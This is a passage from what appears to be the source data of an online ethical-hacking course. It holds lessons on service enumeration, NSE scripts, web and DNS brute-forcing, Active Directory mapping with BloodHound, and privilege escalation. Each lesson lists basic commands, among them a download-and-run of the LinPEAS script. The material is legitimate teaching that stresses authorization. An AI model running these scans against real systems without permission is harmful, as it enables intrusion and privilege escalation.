          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Troubleshoot slow web apps and APIs</li>
            <li>Diagnose packet loss and congestion</li>
            <li>Investigate authentication and session issues</li>
            <li>Detect anomalies and potential attacks</li>
          </ul>
          <p class="mb-6 text-gray-300">Mastering transport‑layer analysis equips you to quickly isolate problems and validate fixes in complex environments.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – TCP/UDP Analysis',
            content: `🛠 Tool Name: hping3

Related Concept: Crafting and probing TCP/UDP packets

What is hping3?
hping3 is a network tool for sending custom TCP, UDP, and ICMP packets. It is useful for testing firewall behavior, measuring latency, and observing protocol responses for analysis.

Why This Tool Matches This Topic
Creates controlled TCP/UDP probes
Observes flags, responses, and timing
Validates firewall and routing behavior
Helps reproduce issues seen in captures

Basic Commands
Send TCP SYN to a port
sudo hping3 -S -p 80 target_ip

Send TCP ACK (firewall rule testing)
sudo hping3 -A -p 80 target_ip

Send UDP probe to DNS
sudo hping3 --udp -p 53 target_ip

Traceroute‑style with TCP SYN
sudo hping3 -S -p 80 --traceroute target_ip

Limit packets and measure RTT
sudo hping3 -S -p 80 -c 5 target_ip

Set TTL and payload size
sudo hping3 -S -p 443 --ttl 64 --data 120 target_ip

Note
Use only on hosts and networks where you have explicit authorization.`
          }
        ]
      }
    ]
  },
  {
    id: 'module-4',
    title: 'Module 4: Enumeration Tools – Nmap, Gobuster & BloodHound',
    duration: '1 week',
    description: 'Advanced enumeration techniques and tools.',
    lessons: [
      {
        title: 'Nmap Service Enumeration',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Service enumeration is one of the most critical phases in cybersecurity and ethical hacking. After discovering live hosts and open ports, the next step is to identify what services are running on those ports. This process is known as service enumeration.</p>
          <p class="mb-6 text-gray-300">Nmap (Network Mapper) is one of the most powerful tools used for service enumeration. It allows security professionals to identify services, versions, configurations, and sometimes even vulnerabilities running on a target system.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Service Enumeration?</h2>
          <p class="mb-3 text-gray-300">Service enumeration involves extracting detailed information about:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Services running on open ports</li>
            <li>Software versions</li>
            <li>Service banners</li>
            <li>Protocol details</li>
            <li>Potential misconfigurations</li>
          </ul>
          <p class="mb-6 text-gray-300">For example, knowing that port 80 is open is useful, but knowing that it runs Apache 2.4.49 on Ubuntu is far more valuable from a security perspective.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Service Enumeration is Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify outdated or vulnerable software</li>
            <li>Map attack surfaces</li>
            <li>Choose the correct exploitation techniques</li>
            <li>Reduce guesswork during penetration testing</li>
          </ul>
          <p class="mb-6 text-gray-300">Attackers rely heavily on service enumeration to plan attacks, while defenders use it to identify weak points and harden systems.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Service Enumeration in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify vulnerable services</li>
            <li>Validate patch levels</li>
            <li>Test real‑world attack scenarios</li>
            <li>Prepare vulnerability assessments</li>
          </ul>
          <p class="mb-6 text-gray-300">Accurate enumeration reduces noise and increases the efficiency of security testing.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Service Enumeration in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Audit network exposure</li>
            <li>Verify compliance with security policies</li>
            <li>Detect unauthorized services</li>
            <li>Improve firewall and IDS rules</li>
          </ul>
          <p class="mb-6 text-gray-300">Regular enumeration helps maintain a secure and controlled network environment.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Risks of Poor Service Management</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Remote code execution</li>
            <li>Privilege escalation</li>
            <li>Data breaches</li>
            <li>Malware infections</li>
          </ul>
          <p class="mb-6 text-gray-300">Service enumeration is the first step toward preventing these risks.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Service Enumeration',
            content: `🛠 Tool Name: Nmap

Related Concept: Service Enumeration

What is Nmap?
Nmap is a powerful open-source network scanning tool used for host discovery, port scanning, service detection, and vulnerability identification.

Why This Tool Matches This Topic
Identifies running services
Detects service versions
Performs banner grabbing
Widely used in real-world security testing

Basic Commands
Basic Service Enumeration
nmap -sV target_ip

Service Enumeration with Default Scripts
nmap -sV -sC target_ip

Service Enumeration on Specific Ports
nmap -sV -p 21,22,80,443 target_ip

Aggressive Service Detection
nmap -A target_ip`
          }
        ]
      },
      {
        title: 'Nmap Script Scanning (NSE Introduction)',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">The Nmap Scripting Engine (NSE) is one of the most powerful features of Nmap. While basic scans identify open ports and services, NSE allows security professionals to perform advanced discovery, enumeration, and vulnerability detection using scripts.</p>
          <p class="mb-6 text-gray-300">These scripts automate complex tasks that would otherwise require multiple tools and manual effort. NSE transforms Nmap from a simple scanner into a lightweight vulnerability assessment framework.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is NSE?</h2>
          <p class="mb-3 text-gray-300">NSE is a scripting platform built into Nmap that uses the Lua programming language. It allows users to run pre‑written scripts or create custom scripts to:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Discover detailed service information</li>
            <li>Detect vulnerabilities</li>
            <li>Perform authentication checks</li>
            <li>Identify misconfigurations</li>
            <li>Enumerate users and shares</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Why NSE is Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Save time during penetration testing</li>
            <li>Automate repetitive security checks</li>
            <li>Increase scan depth and accuracy</li>
            <li>Detect common vulnerabilities quickly</li>
          </ul>
          <p class="mb-6 text-gray-300">Many real‑world attacks begin with NSE scans because they provide actionable intelligence early in an engagement.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Categories of NSE Scripts</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li><code>default</code></li>
            <li><code>safe</code></li>
            <li><code>intrusive</code></li>
            <li><code>auth</code></li>
            <li><code>vuln</code></li>
            <li><code>discovery</code></li>
          </ul>
          <p class="mb-6 text-gray-300">Each category serves a different purpose and must be used responsibly.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">NSE in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Detect known vulnerabilities</li>
            <li>Enumerate services and users</li>
            <li>Validate security controls</li>
            <li>Speed up reconnaissance</li>
          </ul>
          <p class="mb-6 text-gray-300">NSE helps bridge the gap between scanning and exploitation.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">NSE in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Perform internal security audits</li>
            <li>Validate firewall and service configurations</li>
            <li>Identify weak authentication mechanisms</li>
            <li>Improve patch management</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Security Considerations</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Improper use of NSE scripts can trigger IDS/IPS alerts</li>
            <li>Some scripts may cause service disruption</li>
            <li>Scripts may violate usage policies if used without authorization</li>
          </ul>
          <p class="mb-6 text-gray-300">Always use NSE scripts in authorized environments.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – NSE Usage',
            content: `🛠 Tool Name: Nmap (NSE Scripts)

Related Concept: Script-Based Enumeration & Vulnerability Detection

What is this Tool?
This usage of Nmap focuses specifically on executing NSE scripts for advanced scanning and enumeration.

Why This Tool Matches This Topic
Automates vulnerability checks
Enhances service enumeration
Provides deeper insights
Industry-standard approach

Basic Commands
Run Default NSE Scripts
nmap -sC target_ip

Run Specific NSE Script
nmap --script=http-enum target_ip

Run Vulnerability Scripts
nmap --script=vuln target_ip

Run Authentication Scripts
nmap --script=auth target_ip`
          }
        ]
      },
      {
        title: 'Understanding Web Enumeration',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Web enumeration is the process of collecting detailed information about a web application and its underlying infrastructure. Since web applications are one of the most common attack surfaces, understanding how to enumerate them is a core skill in cybersecurity and ethical hacking.</p>
          <p class="mb-6 text-gray-300">Unlike simple port scanning, web enumeration focuses on web servers, directories, files, technologies, and configurations that may expose sensitive information.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Web Enumeration?</h2>
          <p class="mb-3 text-gray-300">Web enumeration involves identifying:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Hidden directories and files</li>
            <li>Web technologies and frameworks</li>
            <li>Server versions and configurations</li>
            <li>Input points and parameters</li>
            <li>Authentication mechanisms</li>
          </ul>
          <p class="mb-6 text-gray-300">This information helps attackers plan attacks and defenders secure applications.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Web Enumeration is Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Discover sensitive or misconfigured resources</li>
            <li>Identify outdated web software</li>
            <li>Understand application structure</li>
            <li>Detect potential attack vectors</li>
          </ul>
          <p class="mb-6 text-gray-300">Many real‑world breaches occur due to exposed admin panels, backup files, or misconfigured directories discovered during enumeration.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Web Enumeration in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Map the web application</li>
            <li>Identify vulnerable endpoints</li>
            <li>Test access controls</li>
            <li>Prepare for exploitation stages</li>
          </ul>
          <p class="mb-6 text-gray-300">Without enumeration, exploitation becomes blind and inefficient.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Web Enumeration in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Audit web applications</li>
            <li>Identify exposed resources</li>
            <li>Improve access controls</li>
            <li>Harden server configurations</li>
          </ul>
          <p class="mb-6 text-gray-300">Regular enumeration reduces the risk of accidental exposure.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Common Web Enumeration Targets</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>/admin, /login, /backup</li>
            <li>Configuration files</li>
            <li>API endpoints</li>
            <li>Hidden or deprecated pages</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Security Risks</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Credentials</li>
            <li>Sensitive data</li>
            <li>Internal logic</li>
            <li>Application vulnerabilities</li>
          </ul>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Web Enumeration',
            content: `🛠 Tool Name: WhatWeb

Related Concept: Web Technology Enumeration

What is WhatWeb?
WhatWeb is a Kali Linux tool used to identify web technologies, including CMS platforms, frameworks, server types, and security headers.

Why This Tool Matches This Topic
Identifies web technologies
Detects frameworks and CMS
Helps understand application stack
Lightweight and fast

Basic Commands
Basic Web Enumeration
whatweb http://target.com

Verbose Output
whatweb -v http://target.com

Scan Multiple Targets
whatweb targets.txt`
          }
        ]
      },
      {
        title: 'Gobuster Directory Bruteforcing',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Directory bruteforcing is a web enumeration technique used to discover hidden directories and files on a web server. Many web applications contain sensitive folders that are not directly linked on the website but are still accessible if the correct path is known.</p>
          <p class="mb-6 text-gray-300">Gobuster is a popular Kali Linux tool designed specifically for fast and efficient directory and file enumeration using wordlists.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Directory Bruteforcing?</h2>
          <p class="mb-3 text-gray-300">Directory bruteforcing works by:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Sending multiple HTTP requests</li>
            <li>Testing common directory and file names</li>
            <li>Analyzing server responses</li>
            <li>Identifying valid paths</li>
          </ul>
          <p class="mb-6 text-gray-300">This process reveals hidden endpoints that may expose administrative panels, backups, or configuration files.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Directory Bruteforcing is Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Discover admin dashboards</li>
            <li>Identify backup and temp files</li>
            <li>Find misconfigured resources</li>
            <li>Map web application structure</li>
          </ul>
          <p class="mb-6 text-gray-300">Many security incidents begin with attackers finding an unprotected admin page through directory enumeration.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Directory Bruteforcing in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify exposed resources</li>
            <li>Test access controls</li>
            <li>Validate secure deployment practices</li>
            <li>Support vulnerability assessments</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Directory Bruteforcing in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Audit web servers</li>
            <li>Detect exposed endpoints</li>
            <li>Improve web application hardening</li>
            <li>Validate security policies</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Common Targets Found</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>/admin</li>
            <li>/backup</li>
            <li>/uploads</li>
            <li>/config</li>
            <li>/api</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Risks and Legal Considerations</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Uncontrolled bruteforcing can trigger WAFs</li>
            <li>Excessive requests may cause service degradation</li>
            <li>Testing without authorization can violate acceptable use policies</li>
          </ul>
          <p class="mb-6 text-gray-300">Always perform testing in authorized environments.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Directory Bruteforcing',
            content: `🛠 Tool Name: Gobuster

Related Concept: Directory & File Enumeration

What is Gobuster?
Gobuster is a fast directory and file brute-forcing tool written in Go. It uses wordlists to discover hidden resources on web servers.

Why This Tool Matches This Topic
High-speed enumeration
Supports directories, DNS, and vhosts
Simple command structure
Widely used in real-world testing

Basic Commands
Directory Bruteforcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

Specify File Extensions
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt

Increase Threads
gobuster dir -u http://target.com -w wordlist.txt -t 50`
          }
        ]
      },
      {
        title: 'Gobuster DNS Enumeration',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">DNS enumeration is the process of discovering subdomains and DNS records associated with a target domain. Many organizations host multiple services on different subdomains, some of which may be forgotten, poorly secured, or intended only for internal use.</p>
          <p class="mb-6 text-gray-300">Gobuster’s DNS mode is widely used in cybersecurity to brute‑force subdomains and uncover hidden assets.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is DNS Enumeration?</h2>
          <p class="mb-3 text-gray-300">DNS enumeration focuses on identifying:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Subdomains</li>
            <li>DNS naming patterns</li>
            <li>Hidden or unused services</li>
            <li>Cloud‑hosted resources</li>
          </ul>
          <p class="mb-6 text-gray-300">For example, discovering <code>admin.example.com</code> or <code>dev.example.com</code> can expose sensitive environments.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why DNS Enumeration is Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Expand attack surface visibility</li>
            <li>Discover staging or development servers</li>
            <li>Identify shadow IT assets</li>
            <li>Improve asset management</li>
          </ul>
          <p class="mb-6 text-gray-300">Many breaches occur because forgotten subdomains remain vulnerable.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">DNS Enumeration in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify additional targets</li>
            <li>Test subdomain security</li>
            <li>Perform reconnaissance</li>
            <li>Validate asset inventories</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">DNS Enumeration in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify unknown assets</li>
            <li>Decommission unused subdomains</li>
            <li>Improve DNS hygiene</li>
            <li>Strengthen monitoring and logging</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Common Risks</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Exposed subdomains may run outdated services</li>
            <li>Weak authentication on secondary portals</li>
            <li>Lack of monitoring on non‑production hosts</li>
          </ul>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – DNS Enumeration',
            content: `🛠 Tool Name: Gobuster (DNS Mode)

Related Concept: Subdomain Enumeration

What is Gobuster DNS Mode?
Gobuster’s DNS mode brute‑forces subdomains using a wordlist and checks whether they resolve via DNS.

Why This Tool Matches This Topic
Fast subdomain discovery
Simple configuration
Effective reconnaissance tool
Works well in lab and real environments

Basic Commands
DNS Enumeration
gobuster dns -d target.com -w /usr/share/wordlists/dns.txt

Show IP Addresses
gobuster dns -d target.com -w dns.txt -i

Increase Threads
gobuster dns -d target.com -w dns.txt -t 50`
          }
        ]
      },
      {
        title: 'Active Directory Basics',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Active Directory (AD) is a directory service developed by Microsoft that is widely used in enterprise environments to manage users, computers, groups, and network resources. It acts as a centralized authentication and authorization system, allowing organizations to control access to resources from a single point.</p>
          <p class="mb-6 text-gray-300">In cybersecurity, Active Directory is extremely important because it is often the primary target during internal network attacks.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Active Directory?</h2>
          <p class="mb-3 text-gray-300">Active Directory stores information about:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Users (employees, admins)</li>
            <li>Computers and servers</li>
            <li>Groups and permissions</li>
            <li>Policies and access rules</li>
          </ul>
          <p class="mb-6 text-gray-300">It enables administrators to manage an entire organization’s network efficiently and securely.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Key Components of Active Directory</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li><span class="font-semibold text-white">Domain</span> – Logical group of objects (users, computers)</li>
            <li><span class="font-semibold text-white">Domain Controller (DC)</span> – Server that manages authentication</li>
            <li><span class="font-semibold text-white">Users & Groups</span> – Control access to resources</li>
            <li><span class="font-semibold text-white">Group Policy (GPO)</span> – Enforces security settings</li>
          </ul>
          <p class="mb-6 text-gray-300">These components work together to maintain control and security within enterprise networks.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Active Directory is Important in Cyber Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>A compromised AD can lead to full network takeover</li>
            <li>Attackers target weak credentials and misconfigurations</li>
            <li>Privilege escalation often occurs through AD abuse</li>
          </ul>
          <p class="mb-6 text-gray-300">Most real‑world corporate attacks involve Active Directory exploitation at some stage.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Active Directory in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Enumerating users and groups</li>
            <li>Finding misconfigured permissions</li>
            <li>Testing privilege escalation paths</li>
            <li>Identifying insecure policies</li>
          </ul>
          <p class="mb-6 text-gray-300">Understanding AD fundamentals is essential before learning advanced tools like BloodHound.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Active Directory in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Harden authentication mechanisms</li>
            <li>Apply least privilege principles</li>
            <li>Monitor suspicious activity</li>
            <li>Reduce attack paths</li>
          </ul>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Active Directory Enumeration',
            content: `🛠 Tool Name: enum4linux

Related Concept: Active Directory & SMB Enumeration

What is enum4linux?
enum4linux is a Kali Linux tool used to gather information from Windows systems and Active Directory environments using SMB.

Why This Tool Matches This Topic
Enumerates users and groups
Identifies domain information
Works well in AD environments
Beginner‑friendly tool

Basic Commands
Basic Enumeration
enum4linux target_ip

Enumerate Users
enum4linux -U target_ip

Enumerate Groups
enum4linux -G target_ip`
          }
        ]
      },
      {
        title: 'What is BloodHound?',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">BloodHound is a powerful tool used in cybersecurity to analyze Active Directory (AD) environments and identify hidden relationships that attackers can exploit. Instead of showing simple lists of users or groups, BloodHound visualizes how objects in Active Directory are connected.</p>
          <p class="mb-6 text-gray-300">This graphical approach makes it easier to understand complex permission structures and privilege escalation paths.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is BloodHound?</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Collects data from Active Directory</li>
            <li>Analyzes permissions and trust relationships</li>
            <li>Displays attack paths visually using graphs</li>
          </ul>
          <p class="mb-6 text-gray-300">It is commonly used by both red teams and blue teams to assess AD security.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why BloodHound is Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify privilege escalation paths</li>
            <li>Detect misconfigured permissions</li>
            <li>Reveal over‑privileged accounts</li>
            <li>Understand real attack possibilities</li>
          </ul>
          <p class="mb-6 text-gray-300">Even well‑maintained networks often contain hidden attack paths that BloodHound can uncover.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">BloodHound in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Find shortest paths to domain admin</li>
            <li>Demonstrate real attack scenarios</li>
            <li>Validate AD security posture</li>
            <li>Support penetration testing reports</li>
          </ul>
          <p class="mb-6 text-gray-300">BloodHound removes guesswork from AD exploitation.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">BloodHound in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Audit Active Directory permissions</li>
            <li>Reduce unnecessary privileges</li>
            <li>Identify risky relationships</li>
            <li>Improve overall AD security</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">How BloodHound Works (High Level)</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Data collection from AD</li>
            <li>Graph-based analysis and visualization</li>
          </ul>
          <p class="mb-6 text-gray-300">This approach highlights relationships that are difficult to identify manually.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – BloodHound Data Collection',
            content: `🛠 Tool Name: SharpHound

Related Concept: Active Directory Data Collection

What is SharpHound?
SharpHound is the official data collection tool used by BloodHound to gather Active Directory information such as users, groups, sessions, and permissions.

Why This Tool Matches This Topic
Collects AD relationship data
Designed specifically for BloodHound
Essential for AD attack path analysis
Industry‑standard AD tool

Basic Commands
Collect All Data
SharpHound.exe -c All

Collect User & Group Information
SharpHound.exe -c UserSession,Group

Specify Output Zip
SharpHound.exe -c All -o output.zip`
          }
        ]
      },
      {
        title: 'Mapping AD Relationships with BloodHound',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Active Directory environments contain thousands of hidden relationships between users, groups, computers, and permissions. Manually identifying how one account can reach another is nearly impossible. BloodHound solves this problem by mapping these relationships visually, making complex AD environments easy to understand.</p>
          <p class="mb-6 text-gray-300">Mapping AD relationships is crucial for identifying real attack paths, not just theoretical vulnerabilities.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What Does “Mapping AD Relationships” Mean?</h2>
          <p class="mb-3 text-gray-300">Mapping AD relationships involves identifying:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Which users belong to which groups</li>
            <li>Who has administrative access to which systems</li>
            <li>Trust relationships between domains</li>
            <li>Permissions that allow lateral movement</li>
          </ul>
          <p class="mb-6 text-gray-300">These relationships determine how an attacker can move through a network.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Mapping Relationships is Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Reveal privilege escalation paths</li>
            <li>Identify excessive permissions</li>
            <li>Detect misconfigured delegation</li>
            <li>Understand real-world attack flow</li>
          </ul>
          <p class="mb-6 text-gray-300">Often, a low-privileged user can reach Domain Admin through indirect permissions that are not obvious without graph analysis.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">BloodHound Graph Analysis</h2>
          <p class="mb-3 text-gray-300">BloodHound represents AD objects as nodes and permissions as edges. This graph-based approach allows analysts to:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Search for shortest attack paths</li>
            <li>Visualize risky relationships</li>
            <li>Prioritize remediation efforts</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Use in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Demonstrate real attack paths</li>
            <li>Explain risks to management</li>
            <li>Simulate internal threat scenarios</li>
            <li>Validate security controls</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Use in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Reduce attack surface</li>
            <li>Remove unnecessary privileges</li>
            <li>Enforce least privilege</li>
            <li>Improve AD design and hygiene</li>
          </ul>
        `,
        duration: '25 min',
        syntax: [
          {
            title: 'Kali Linux Tool – AD Mapping',
            content: `🛠 Tool Name: BloodHound

Related Concept: Active Directory Relationship Mapping

What is BloodHound Tool?
BloodHound is the analysis and visualization platform that processes data collected by SharpHound and displays AD relationships as interactive graphs.

Why This Tool Matches This Topic
Visualizes AD attack paths
Identifies privilege escalation routes
Easy-to-understand graphical interface
Essential AD security tool

Basic Commands
Start Neo4j Database
neo4j console

Launch BloodHound
bloodhound

Import SharpHound Data
Upload collected .zip file via BloodHound UI`
          }
        ]
      },
      {
        title: 'Privilege Escalation Concepts',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Privilege escalation is a technique where an attacker gains higher-level access than originally intended. In most real‑world cyber attacks, attackers do not start with full administrative privileges. Instead, they begin with low‑level access and gradually move upward.</p>
          <p class="mb-6 text-gray-300">Understanding privilege escalation is essential for both attackers and defenders because it represents one of the most dangerous phases of a cyber attack.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Privilege Escalation?</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>A user gains unauthorized elevated permissions</li>
            <li>A system flaw allows higher access</li>
            <li>Misconfigurations are abused</li>
          </ul>
          <p class="mb-6 text-gray-300">The goal is often to reach administrator or root-level access.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Types of Privilege Escalation</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li><span class="font-semibold text-white">Vertical Privilege Escalation</span> – Gaining higher privileges (user to admin)</li>
            <li><span class="font-semibold text-white">Horizontal Privilege Escalation</span> – Accessing another user’s privileges at the same level</li>
          </ul>
          <p class="mb-6 text-gray-300">Both types can lead to serious security breaches.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Privilege Escalation is Critical</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Access sensitive data</li>
            <li>Disable security controls</li>
            <li>Move laterally across systems</li>
            <li>Take complete control of networks</li>
          </ul>
          <p class="mb-6 text-gray-300">Many advanced attacks depend on successful privilege escalation.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Privilege Escalation in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Weak permissions</li>
            <li>Insecure configurations</li>
            <li>Vulnerable services</li>
            <li>Poor credential management</li>
          </ul>
          <p class="mb-6 text-gray-300">This helps organizations fix issues before attackers exploit them.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Privilege Escalation in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Applying least privilege</li>
            <li>Monitoring access changes</li>
            <li>Regular patching</li>
            <li>Auditing permissions</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Common Causes</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Weak file permissions</li>
            <li>Unpatched vulnerabilities</li>
            <li>Misconfigured services</li>
            <li>Excessive user privileges</li>
          </ul>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Privilege Escalation Enumeration',
            content: `🛠 Tool Name: LinPEAS

Related Concept: Privilege Escalation Enumeration

What is LinPEAS?
LinPEAS is a Linux privilege escalation enumeration script that scans systems for misconfigurations, vulnerabilities, and weak permissions that can lead to elevated access.

Why This Tool Matches This Topic
Automates privilege escalation checks
Identifies misconfigurations
Beginner-friendly output
Widely used in security labs

Basic Commands
Download LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

Make Executable
chmod +x linpeas.sh

Run LinPEAS
./linpeas.sh`
          }
        ]
      }
    ]
  },
  {
    id: 'module-5',
    title: 'Module 5: Firewalls & Network Protection',
    duration: '1 week',
    description: 'Understanding network defense mechanisms.',
    lessons: [
      {
        title: 'What is a Firewall?',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
